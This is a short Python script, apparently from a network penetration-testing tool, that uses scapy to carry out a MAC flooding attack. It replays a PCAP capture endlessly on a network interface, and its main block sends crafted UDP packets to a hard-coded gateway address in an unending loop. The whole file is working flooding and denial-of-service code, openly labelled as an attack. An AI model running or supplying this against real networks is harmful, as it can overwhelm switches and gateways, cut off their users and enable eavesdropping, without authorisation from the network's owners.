import scapy.all as scapy
import six
import time
def mac_flooding(file, interface):

    #Read PCAP file. Can raise exception if file is not valid
    pkts = scapy.rdpcap(file)

    #Launch attack
    six.print_("[*] MAC Flooding attack STARTED")
    six.print_("[*] To stop the attack: ")
    six.print_("    If launched with '&' execute: 'sudo netpyntest.py mac_flooding stop'")
    six.print_("    If launched without '&' press Ctrl+C")

    while True:
        scapy.sendpfast(pkts, verbose=False, iface=interface)

if __name__ == '__main__':
    ubuntu_Ether = '08:00:27:e0:e3:5a'
    gateway_Ether = '02:00:4c:4f:4f:50'
    blackhole = '1.2.3.4'
    gateway = '192.168.137.1'
    ether = scapy.Ether(src = ubuntu_Ether,dst = gateway_Ether)
    ip = scapy.IP(dst = gateway, src = '192.168.137.209')
    udp = scapy.UDP(dport = 53, sport = 54321)
    '''
    bit 0: Reserved; must be zero.[b]
    bit 1: Don't Fragment (DF)
    bit 2: More Fragments (MF)
    '''
    ip.flags = 0
    packet = ether/ip/udp
    count = 0
    while(1):
        time.sleep(0.05)
        scapy.sendpfast(packet)
        count+=1
        print(count)